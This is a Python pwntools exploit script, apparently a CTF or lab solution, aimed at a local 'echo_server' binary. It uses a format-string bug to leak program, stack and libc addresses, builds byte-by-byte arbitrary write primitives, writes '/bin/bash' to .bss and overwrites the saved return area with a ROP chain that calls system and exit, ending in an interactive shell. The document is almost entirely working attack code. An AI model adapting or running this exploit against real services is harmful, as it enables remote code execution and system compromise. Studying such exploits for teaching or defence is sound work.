#!/usr/bin/env python2
from pwn import *

def loc():
    global elf, libc
    elf = ELF("./echo_server")
    libc = elf.libc
    return process("./echo_server")

def rem():
    global elf, libc
    elf = ELF("./echo_server")
    libc = ELF("./libc.so.6")
    return remote("127.0.0.1", 10006)

def format_lx(i):
    return "%{}$lx".format(str(i).rjust(4, "0"))

def format_s(i):
    return "%{}$s".format(str(i).rjust(5, "0"))

def format_hhn(i):
    return "%{}$hhn".format(str(i).rjust(3, "0"))

def format_data(i, length):
    return "%{}${}d".format(str(i).rjust(6, "0"), str(length).rjust(7, "0"))

def pause():
    raw_input("PAUSE")

# Enumerate the data available as printf arguments
def enumerate(start, end):
    global r

    for i in range(start, end):
        input = format_lx(i)
        r.send(input)
        print "%d: %s" % (i, r.recv(1024))

# input_index is where the first 8 bytes of our input are
def find_input_index():
    global r

    for i in range(20):
        input = "A" * 8 + format_lx(i)
        r.send(input)
        output = r.recv(1024)
        if "4141414141" in output:
            return i

r = rem()

# # pause and attach with debugger to check rbp and program base address
# pause()
# # find an address that points to the stack and one that points to the program
# enumerate(0, 500)
# exit(0)

# Argument 141 points to the program
r.send(format_lx(146))
address = r.recv(1024)
address = int(address, 16)
program_base = address & 0xfffffffffffff000

# Argument 145 points to the stack
r.send(format_lx(141))
address = r.recv(1024)
address = int(address, 16)
rbp = address - 0xf8

# input_index = find_input_index()
input_index = 6

def read(address):
    address = p64(address)
    input = format_s(input_index + 2) + "A" * 8 + address
    r.send(input)

    output = r.recv(1024)
    output = output[: - (len(input[: input.find("\x00")]) - 8)]
    output += "\x00"
    return output

def write(address, value):
    address = p64(address)

    if value > 0:
        input = format_data(20, value) + format_hhn(input_index + 3) + address
    else:
        input = format_hhn(input_index + 3) * 3 + address

    r.send(input)

    # Receive all the data
    for i in range(0, value + len(address[: address.find("\x00")]), 1024):
        r.recv(1024)

def write_bytes(address, string):
    for i in range(len(string)):
        byte = string[i]
        byte = u8(byte)

        try:
            write(address + i, byte)
        except Exception as e:
            print hex(byte)
            raise e

printf_got = elf.got["printf"]
printf_got = program_base + printf_got
bss = program_base + elf.bss()
command_location = bss + 0x100
pop_rdi_gadget = 0x993
pop_rdi_gadget = program_base + pop_rdi_gadget
pop_rsi_r15_gadget = 0x991
pop_rsi_r15_gadget = program_base + pop_rsi_r15_gadget

printf_real_address = u64(read(printf_got).ljust(8, "\x00"))
libc_base = printf_real_address - libc.symbols["printf"]
system_real_address = libc_base + libc.symbols["system"]
exit_real_address = libc_base + libc.symbols["exit"]

print ""
print "libc file: %s" % libc.path
print "system offset: %s" % hex(libc.symbols["system"])
print ""
print "libc:   %s" % hex(libc_base)
print "printf: %s" % hex(printf_real_address)
print "system: %s" % hex(system_real_address)
print ""
print "program base:    %s" % hex(program_base)
print "bss: %s" % hex(bss)
print "command location: %s" % hex(command_location)
print "pop rdi: %s" % hex(pop_rdi_gadget)
print "pop rsi: %s" % hex(pop_rsi_r15_gadget)
print "rbp: %s" % hex(rbp)

write_bytes(command_location, "/bin/bash")

chain = [
    # Set argument to our command
    p64(pop_rdi_gadget),
    p64(command_location),
    # Realign stack to 16n + 8 (if you don't do this, system will crash)
    p64(pop_rsi_r15_gadget),
    p64(0),
    p64(0),
    # Call system
    p64(system_real_address),
    # Set argument to 0
    p64(pop_rdi_gadget),
    p64(0),
    # Call exit
    p64(exit_real_address),
]

for i in range(len(chain)):
    write_bytes(rbp + 0x8 * (i + 1), chain[i])

r.send("EXIT")
r.interactive()
